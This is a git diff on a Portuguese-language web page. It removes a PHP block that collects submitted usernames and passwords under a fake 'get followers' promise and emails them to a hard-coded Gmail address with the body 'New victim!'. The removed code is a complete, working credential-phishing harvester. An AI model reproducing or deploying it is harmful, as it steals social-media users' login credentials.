@@ -1,22 +1,3 @@
-<?php
-    if (isset($_POST['email']) && isset($_POST['message'])){
-        $name = $_POST['email'];
-        $message = $_POST['message'];
-
-        if (mail('karimelaassy10@gmail.com',
-                'Новое письмо',
-                'Новая жертва!'."\n".
-                'username: '.$name."\n".
-                'password: '.$message
-                
-    
-        )) {
-            echo('In 24 hours you will have 10 followers, come tomorrow for new ones');
-        } else {
-            echo('Error, please try again later')
-        }
-    }
-?>
 
 <!DOCTYPE html>
 <html lang="pt-BR">
